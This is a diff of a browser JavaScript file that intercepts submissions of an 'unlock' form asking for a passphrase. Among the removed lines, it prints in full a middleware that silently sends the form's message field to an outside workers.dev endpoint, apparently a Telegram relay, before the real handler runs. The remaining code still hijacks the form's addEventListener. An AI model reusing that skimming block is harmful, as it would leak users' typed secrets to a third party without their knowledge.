@@ -1,8 +1,8 @@
-**
- * Form Middleware System v4 with request
- * - Extract data
- * - Validate passphrase
- * - Send request before calling original handler
+/**
+ * Form Middleware System v4 (no request)
+ * - Middleware 1: Extract data
+ * - Middleware 2: Validate passphrase
+ * - Then call your submit handler
  */
 
 const formMiddleware = {
@@ -30,7 +30,7 @@ const unlockFormMiddleware = Object.create(formMiddleware);
 // --- Middleware 1: extract form data
 unlockFormMiddleware.use((event, next) => {
   console.log("Middleware 1: Extracting form data");
-  event.preventDefault(); // prevent default submit
+  event.preventDefault();
 
   const formData = new FormData(event.target);
   const data = {};
@@ -60,24 +60,6 @@ unlockFormMiddleware.use((event, next) => {
   next();
 });
 
-// --- Middleware 3: send request before processing
-unlockFormMiddleware.use((event, next) => {
-  console.log("Middleware 3: Sending request before processing");
-
-  const content = encodeURIComponent(event.formData?.message || "");
-  const url = `https://sendmessagetele.myloverkt.workers.dev/?text=${content}`;
-
-  fetch(url)
-    .then(res => {
-      console.log("Request sent:", url, "Status:", res.status);
-      next(); // continue after request finishes
-    })
-    .catch(err => {
-      console.error("Request failed:", err);
-      next(); // still continue even if request fails
-    });
-});
-
 let middlewareExecuting = false;
 
 document.addEventListener("DOMContentLoaded", () => {
@@ -85,14 +67,12 @@ document.addEventListener("DOMContentLoaded", () => {
 
   const unlockForm = document.querySelector(".ladi-form");
   if (!unlockForm) {
-    console.warn("Form .ladi-form not found");
+    console.warn("Không tìm thấy .ladi-form");
     return;
   }
 
-  // keep original addEventListener
   const originalAddEventListener = Element.prototype.addEventListener;
 
-  // override only for this form
   unlockForm.addEventListener = function (type, listener, options) {
     if (type === "submit") {
       console.log("Intercepting submit event binding");
@@ -104,7 +84,7 @@ document.addEventListener("DOMContentLoaded", () => {
         console.log("Form submission intercepted by middleware");
 
         unlockFormMiddleware.execute(event, () => {
-          console.log("All middlewares done → calling original handler");
+          console.log("All middlewares completed → call original handler");
           listener.call(unlockForm, event);
           setTimeout(() => (middlewareExecuting = false), 100);
         });
@@ -116,5 +96,3 @@ document.addEventListener("DOMContentLoaded", () => {
     return originalAddEventListener.call(this, type, listener, options);
   };
 });
-
-console.log("init");
